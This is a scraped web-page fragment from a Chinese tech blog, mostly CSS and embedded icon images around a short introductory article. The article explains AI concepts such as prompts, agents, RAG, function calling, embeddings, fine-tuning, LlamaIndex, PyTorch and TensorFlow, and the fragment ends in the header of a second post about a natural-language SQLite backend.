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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 需要学会的技能</h2>
<h3 data-id="heading-1">1.1 提示词工程(prompt)</h3>
<p><strong>用户提供给人工智能的指令或问题，用于引导和激发模型完成特定任务</strong></p>
<h3 data-id="heading-2">1.2 ai agent(智能体）</h3>
<p><strong>能感知环境、自主决策并执行动作以实现目标的智能体</strong></p>
<ul>
<li><strong>核心特征：</strong>  它具备<strong>自主性</strong>，无需每一步都由人类指导</li>
<li><strong>基本框架：</strong>  通常遵循经典的  <strong>“感知-规划-行动”</strong>  
<ul>
<li><strong>感知：</strong>  使用工具（如搜索引擎、摄像头、数据库）获取外界信息。</li>
<li><strong>规划：</strong>  思考如何分解目标并制定步骤</li>
<li><strong>行动：</strong> 执行具体操作（如调用API、控制机械臂、生成文本）来改变环境</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">1.3 RAG</h3>
<p>通过从外部资源或数据库中纳入相关信息来实现知识的增强，一种通过检索外部知识来增强生成内容准确性和相关性的技术。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b9b745c520e406c80afb914d0e1df90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKz55WU55qE6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765473250&amp;x-signature=5uNi5y4hMwxbcWjXsA%2BDsknu%2BLA%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">1.4 Function Calling</h3>
<p><strong>与外部函数或API交互的能力，大语言模型根据用户请求，智能识别并输出结构化参数，以调用外部工具或函数的能力</strong></p>
<ol>
<li><strong>它的角色：</strong> 它是大模型（如ChatGPT）与外部世界（如执行代码、查询数据库、调用API）进行交互的“桥梁”和“翻译官”。</li>
<li><strong>工作流程：</strong> 模型不直接执行函数，而是通过分析你的自然语言指令（例如：“给张三发邮件，提醒他明天下午三点开会”），然后输出一个结构化的JSON对象，其中包含需要调用的函数名（<code>send_email</code>）和正确的参数（<code>recipient: "张三"</code>, <code>content: "..."</code>），最后由其他程序来执行这个函数。</li>
</ol>
<h3 data-id="heading-5">1.5 Embedding</h3>
<p><strong>Embedding是将文字、图像或声音等高维复杂数据，转换为一系列低维稠密向量的过程。</strong></p>
<ul>
<li><strong>核心目的：</strong>  将人类能理解的符号（如单词、句子）转换成计算机能够理解和计算的数学形式（即向量）。</li>
<li><strong>关键特性：</strong>
<ul>
<li><strong>语义信息：</strong>  在这个向量空间中，语义相近的词语（如“国王”和“皇后”）或句子，其向量在空间中的位置也更接近。</li>
<li><strong>可计算性：</strong>  计算机可以通过计算向量之间的距离或余弦相似度，来判断两段内容的相似性。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-6">1.6 Fine-tuning（微调）</h3>
<p><strong>是在预训练模型的基础上，使用特定领域的数据进行额外训练，使其专门化以适应新任务的过程</strong></p>
<p>比喻：老师（开发者）针对学生的特长（模型的潜力），用专门的练习题（领域数据）进行辅导，强化他在特定科目上的能力</p>
<h3 data-id="heading-7">1.7 LlamaIndex</h3>
<p><strong>一个专为大语言模型（LLM）应用程序设计的数据框架，它能高效地将私有或特定领域的数据与LLM结合起来</strong></p>
<p>这个框架的核心作用是解决LLM在处理外部私有数据时遇到的困难。
它通过一套工具，帮助你轻松地从各种数据源（如PDF、数据库、API）摄取数据，并构建成易于查询的索引结构（例如向量索引）。通俗地说，你可以将它视为连接<strong>你的数据</strong>和<strong>大语言模型</strong>之间的一个“智能桥梁”</p>
<h3 data-id="heading-8">1.8 PyTorch</h3>
<p><strong>PyTorch是一个基于Python的开源深度学习框架，以其动态计算图和直观易用性而闻名。</strong></p>
<p>为了让您更好地理解，这里有几个关键解读：</p>
<ul>
<li><strong>核心特点：</strong>  它提供了强大的GPU加速张量计算功能，并且由于其 <strong><code>动态图</code>（Define-by-Run）</strong> 的特性，使得研究和调试模型变得更加灵活和直观。</li>
<li><strong>主要应用：</strong>  它是目前学术界和工业界最受欢迎的框架之一，广泛用于从研究原型设计到生产部署的整个机器学习生命周期。</li>
<li><strong>简单类比：</strong>  您可以把它想象成深度学习的“Numpy”，但提供了自动求导和导和强大的GPU支持，使得构建和训练复杂的神经网络变得非常简单。</li>
</ul>
<h3 data-id="heading-9">1.9 TensorFlow</h3>
<p><strong>TensorFlow是一个由Google开发的端到端开源机器学习平台，以其强大且成熟的生产级部署能力著称。</strong></p>
<p>为了帮助您更好地理解，这里是几点关键解读：</p>
<ul>
<li><strong>核心定位：</strong>  它是一个覆盖从<strong>研究建模</strong>到<strong>产业部署</strong>全流程的完整生态系统，而不仅仅是一个库。</li>
<li><strong>历史特点：</strong>  早期以其独特的<strong>静态计算图</strong>闻名，虽然现在也支持了动态图（Eager Execution），但其在分布式训练和大规模服务方面的稳定性和性能是其传统优势。</li>
<li><strong>组成部分：</strong>  除了核心的深度学习框架，还包含了用于移动设备和边缘计算的TensorFlow Lite、用于浏览器环境的TensorFlow.js等一系列工具。</li>
</ul>
<h2 data-id="heading-10">2. 关于AI Agent</h2>
<h3 data-id="heading-11">2.1 AI Agent介绍</h3>
<p>AI Agent 是指人工智能代理（Artificial Intelligence Agent）是一种能够感知环境进行自主理解，进行
决策和执行动作的智能体。AI Agent具备通过独立思考、调用工具逐步完成给定目标的能力。</p>
<p>一个基于大模型的AI Agent系统可以拆分 LLM（大模型）、记忆（Memory）、任务规划（Planning）
以及工具使用（Tool） 的集合。在LLM为基础的AI Agent系统中，大模型为AI Agent系统的大脑负责
计算，并需要其他组件进行辅助。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4d848b4e0bb4dd8bd90118df002c8d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKz55WU55qE6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765473250&amp;x-signature=6YkupScc1S4VF1TeE3FI8JmsgFg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-12">2.2 多个agen协作</h3>
<p>多Agent模型（Multi-Agent Model）是一种分布式人工智能模型，由多个智能体（Agent）组成，每
个Agent都具有自主决策和交互能力，能够相互协作、竞争或协商以完成共同或各自的任务。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ec16a19664d40c6b7c96e1c4ef4804b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKz55WU55qE6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765473250&amp;x-signature=uo32LvtuAO71ccD3LyqFMBLmIYY%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[说人话，查数据：构建一个自然语言驱动的 SQLite 后台]]></title>    <link>https://juejin.cn/post/7579843977848569910</link>    <guid>https://juejin.cn/post/7579843977848569910</guid>    <pubDate>2025-12-05T02:34:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579843977848569910" data-draft-id="7579846221167804470" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="说人话，查数据：构建一个自然语言驱动的 SQLite 后台"/> <meta itemprop="keywords" content="LLM,DeepSeek,SQLite"/> <meta itemprop="datePublished" content="2025-12-05T02:34:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="有意义"/> <meta itemprop="url" content="https://juejin.cn/user/1739866211617625"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            说人话，查数据：构建一个自然语言驱动的 SQLite 后台
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1739866211617625/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    有意义
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:34:01.000Z" title="Fri Dec 05 2025 02:34:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 